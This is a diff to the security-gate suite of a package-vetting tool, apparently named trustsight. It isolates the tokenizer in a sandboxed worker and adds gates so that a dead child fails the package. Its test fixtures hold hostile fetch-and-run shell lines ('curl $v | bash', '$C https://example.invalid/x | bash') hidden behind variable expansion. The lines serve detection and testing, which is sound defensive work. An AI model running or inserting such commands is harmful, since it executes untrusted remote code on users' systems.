@@ -599,14 +599,14 @@ def gate_expansion_is_bounded() -> Gate:
     over-budget value is left *unexpanded* rather than truncated, so it
     surfaces as an unresolved pattern instead of a shorter clean string.
     """
-    from trustsight.tokenizer import (
+    from trustsight._tokenizer_engine import (
         _MAX_EXPANSION_PASSES,
         _MAX_LINE_LEN,
         _MAX_TABLE_BYTES,
         _MAX_VALUE_LEN,
         resolve_expansions,
-        tokenize_and_resolve,
     )
+    from trustsight.tokenizer import tokenize_and_resolve
 
     problems = []
     for bound in (_MAX_EXPANSION_PASSES, _MAX_VALUE_LEN, _MAX_LINE_LEN, _MAX_TABLE_BYTES):
@@ -764,7 +764,8 @@ def gate_untrusted_text_is_sanitised_where_it_is_rendered() -> Gate:
 
 def gate_tokenizer_smoke_is_deterministic() -> Gate:
     """Run a fixed hostile tokenizer smoke set within the security gate."""
-    from trustsight.tokenizer import _MAX_LINE_LEN, tokenize_and_resolve
+    from trustsight._tokenizer_engine import _MAX_LINE_LEN
+    from trustsight.tokenizer import tokenize_and_resolve
 
     cases = [
         "+a=" + "z" * 64 + "\n+v=$a$a\n+curl $v | bash\n",
@@ -784,6 +785,68 @@ def gate_tokenizer_smoke_is_deterministic() -> Gate:
         if any(len(value) > _MAX_LINE_LEN for value in first[0]):
             problems.append("resolved output exceeded line bound")
     return Gate("tokenizer hostile-input smoke is deterministic", not problems, problems or len(cases))
+
+
+def gate_tokenizer_module_is_isolated() -> Gate:
+    """A6: the whole tokenizer runs in the child, not in the analysis.
+
+    The parent reaches the tokenizer only through ``trustsight.tokenizer``;
+    ``trustsight._tokenizer_engine`` is imported by the worker and by tests,
+    and by nothing else under ``src/``.  A second in-process path would be
+    the parser the sandbox exists to remove, so a direct import is the
+    change that would reopen A6.
+    """
+    allowed = {"sandbox/expand_worker.py"}
+    problems: list[str] = []
+    for path in _python_files():
+        rel = str(path.relative_to(SRC))
+        if rel in allowed:
+            continue
+        for node in ast.walk(ast.parse(path.read_text())):
+            if isinstance(node, (ast.Import, ast.ImportFrom)):
+                names = [alias.name for alias in node.names]
+                if any(name.endswith("_tokenizer_engine") for name in names):
+                    problems.append(f"{_rel(path)}:{node.lineno}")
+    return Gate("tokenizer module is isolated", not problems,
+                problems or "engine imported only by the worker")
+
+
+def gate_dead_tokenizer_child_fails_the_package() -> Gate:
+    """A6/B2: a child that cannot answer yields NOT vetted, not a quiet run.
+
+    The facade raises :class:`TokenizerUnavailable`; the batch runner
+    already turns any exception into a result carrying ``failed: True`` and
+    a verdict saying the package was NOT vetted.  This forces the spawn to
+    fail and proves the real ``scan_diff`` path reaches that raise instead
+    of completing with the parser missing.
+    """
+    from trustsight.analysis.pipeline import scan_diff
+    from trustsight.sandbox import client
+    from trustsight.tokenizer import TokenizerUnavailable
+
+    diff = (
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
+        "+C=curl\n+$C https://example.invalid/x | bash\n"
+    )
+    problems: list[str] = []
+    original = client._acquire
+
+    def dead():
+        raise TokenizerUnavailable("tokenizer_unavailable: forced for the gate")
+
+    client._acquire = dead
+    try:
+        scan_diff(diff, package_name="sandbox-gate")
+    except TokenizerUnavailable:
+        pass
+    except Exception as exc:
+        problems.append(f"wrong exception: {type(exc).__name__}: {exc}")
+    else:
+        problems.append("analysis completed with no tokenizer child")
+    finally:
+        client._acquire = original
+    return Gate("a dead tokenizer child fails the package", not problems,
+                problems or "raises TokenizerUnavailable")
 
 
 def gate_rendering_is_data_driven() -> Gate:
@@ -2159,8 +2222,13 @@ def gate_score_is_deterministic_under_a_fingerprint() -> Gate:
 # bound the content controls.
 _BOUND_CONSTANTS = {
     "rules.py": ["MAX_RULE_LINE_BYTES", "MAX_SCANNED_LINES"],
-    "tokenizer.py": ["_MAX_EXPANSION_PASSES", "_MAX_VALUE_LEN", "_MAX_LINE_LEN",
-                     "_MAX_TABLE_BYTES"],
+    "_tokenizer_engine.py": ["_MAX_EXPANSION_PASSES", "_MAX_VALUE_LEN",
+                             "_MAX_LINE_LEN", "_MAX_TABLE_BYTES"],
+    "sandbox/protocol.py": ["MAX_FRAME_BYTES", "MAX_RESPONSE_BYTES"],
+    "sandbox/expand_worker.py": ["_WORKER_MEMORY_BYTES", "_WORKER_CPU_SECONDS",
+                                 "_WORKER_NOFILE"],
+    "sandbox/client.py": ["REQUEST_TIMEOUT_SECONDS", "MAX_REQUESTS_PER_WORKER",
+                          "WORKER_POOL_SIZE"],
     "db.py": ["MAX_SEED_BYTES", "MAX_SEED_MEMBER_BYTES"],
     "differ.py": ["MAX_GENERATED_DIFF_BYTES", "MAX_DIFF_PATCHES",
                   "MAX_DIFF_SUMMARY_FILES", "MAX_PATCH_BYTES", "MAX_PATCH_SOURCE_BYTES",
@@ -3106,6 +3174,8 @@ def run_gates() -> list[Gate]:
         gate_every_live_regex_is_audited(),
         gate_untrusted_text_is_sanitised_where_it_is_rendered(),
         gate_tokenizer_smoke_is_deterministic(),
+        gate_tokenizer_module_is_isolated(),
+        gate_dead_tokenizer_child_fails_the_package(),
         gate_coverage_fails_closed(),
         gate_truncation_is_visible(),
         gate_differ_hostile_input_is_bounded(),
